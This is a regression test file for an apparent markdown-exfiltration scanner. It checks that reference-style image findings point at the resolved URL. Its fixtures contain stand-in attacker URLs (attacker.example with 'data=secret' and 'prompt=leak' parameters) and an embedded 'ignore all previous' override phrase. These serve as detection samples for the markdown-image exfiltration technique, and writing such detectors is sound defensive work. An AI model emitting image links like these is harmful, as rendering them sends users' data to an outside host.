/**
 * v1.5.0 followup regression: md-image-ref matchLen contract.
 *
 * Before:
 *   - Reference-image findings (`element: "md-image-ref"`) had
 *     `position = m.indices[0][0]` — the start of the `![alt][id]` use-site —
 *     while `matchLen = url.length` (resolved URL length from the `[id]: url`
 *     definition line). Use-site length (`"![alt][id]".length` = 14 in the
 *     fixture) differs from the resolved URL length (>40 chars), so
 *     `content.slice(position, position + matchLen)` either ran off the end of
 *     the use-site span or — worse — bracketed a garbage byte range that
 *     included the surrounding markdown and part of the definition. That broke
 *     the (position, matchLen) bracket invariant every other finding obeys.
 *
 * After:
 *   - pass-1 captures `m.indices[2][0]` from RE_REF_DEF as `urlStart` per
 *     reference id.
 *   - pass-3 emits the finding with `position = refDef.urlStart`. The URL
 *     length and the slice now agree:
 *
 *         content.slice(f.position, f.position + f.matchLen) === url
 *
 *   - R12 (shadow leak): the resolved URL still surfaces only as `content`
 *     (escaped), never re-injected into the `technique` banner string.
 *   - R13 (baseline byCategory): no new top-level keys; finding still lands
 *     under `hiddenHtml`.
 */

import { describe, it, expect } from "vitest";
import { detectMarkdownExfil, analyze } from "@shield-scanner/core";

describe("md-image-ref matchLen contract (v1.5.0 followup)", () => {
  it("position+matchLen brackets the URL in the definition line, not the use-site", () => {
    const url = "https://attacker.example.com/?data=secret&prompt=leak";
    const content = `![alt][badref]\n\n[badref]: ${url}`;

    const out = detectMarkdownExfil(content);
    expect(out.length).toBe(1);

    const f = out[0];
    expect(f.element).toBe("md-image-ref");

    // Contract: the (position, matchLen) pair MUST bracket a single substring
    // of `content` that equals the URL itself.
    expect(typeof f.position).toBe("number");
    expect(typeof f.matchLen).toBe("number");
    expect(f.matchLen).toBe(url.length);

    const bracketed = content.slice(f.position, f.position + f.matchLen);
    expect(bracketed).toBe(url);

    // Sanity: the bracketed range does NOT collide with the `![alt][badref]`
    // use-site span. The use-site lives at offset 0..14; the URL must start
    // strictly after that.
    expect(f.position).toBeGreaterThan("![alt][badref]".length);
  });

  it("works with a reference image that resolves to a strong-key URL", () => {
    const url = "http://attacker.example/log?prompt=ignore+all+previous";
    const content = [
      `Here is a cat ![cute cat][catref] for you.`,
      ``,
      `[catref]: ${url}`,
    ].join("\n");

    const out = detectMarkdownExfil(content);
    expect(out.length).toBe(1);
    const f = out[0];
    expect(f.element).toBe("md-image-ref");
    expect(f.severity).toBe("danger");
    expect(content.slice(f.position, f.position + f.matchLen)).toBe(url);
  });

  it("R12: technique string still fixed-phrase, no host/key embedded", () => {
    const content =
      `![alt][r]\n\n[r]: https://attacker.example.com/?prompt=PAYLOAD`;
    const out = detectMarkdownExfil(content);
    expect(out.length).toBe(1);
    expect(out[0].technique).toBe(
      "Markdown image exfiltration (strong key)",
    );
    expect(out[0].technique).not.toContain("attacker.example");
    expect(out[0].technique).not.toContain("prompt");
  });

  it("R13: ref-image still lands under hiddenHtml, byCategory unchanged", () => {
    const content =
      `![alt][r]\n\n[r]: https://attacker.example.com/?prompt=PAYLOAD`;
    const r = analyze(content, { fileType: "markdown" });
    expect(Object.keys(r.summary.byCategory).sort()).toEqual(
      [
        "controlChars",
        "hiddenHtml",
        "homoglyphs",
        "invisibleUnicode",
        "suspiciousPatterns",
      ].sort(),
    );
    const refFinding = r.findings.hiddenHtml.find(
      (x) => x.element === "md-image-ref",
    );
    expect(refFinding).toBeDefined();
    // Same contract end-to-end through analyze().
    const url = "https://attacker.example.com/?prompt=PAYLOAD";
    expect(refFinding.matchLen).toBe(url.length);
    expect(
      content.slice(
        refFinding.position,
        refFinding.position + refFinding.matchLen,
      ),
    ).toBe(url);
  });

  it("no false positive when ref id does not resolve", () => {
    // No `[badref]: ...` definition exists, so the ref-image must be silent
    // (no exception, no finding, no out-of-bounds position).
    const content = `![alt][badref] but no definition here.`;
    expect(detectMarkdownExfil(content)).toEqual([]);
  });
});
